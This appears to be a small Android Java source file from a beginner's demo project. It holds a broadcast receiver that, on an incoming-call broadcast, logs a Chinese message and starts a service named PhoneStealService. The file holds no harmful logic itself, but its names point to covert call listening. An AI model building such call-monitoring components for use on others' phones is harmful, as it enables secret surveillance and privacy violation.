package com.zff.myfirstdemo;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.util.Log;

/**
 * Created by 76598 on 2017/6/19.
 */

public class PhoneSyealReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        Log.i("phone", "onReceive: 收到来电广播，即将启动监听服务……");
        Intent intent1 = new Intent(context, PhoneStealService.class);
        context.startService(intent1);

    }
}
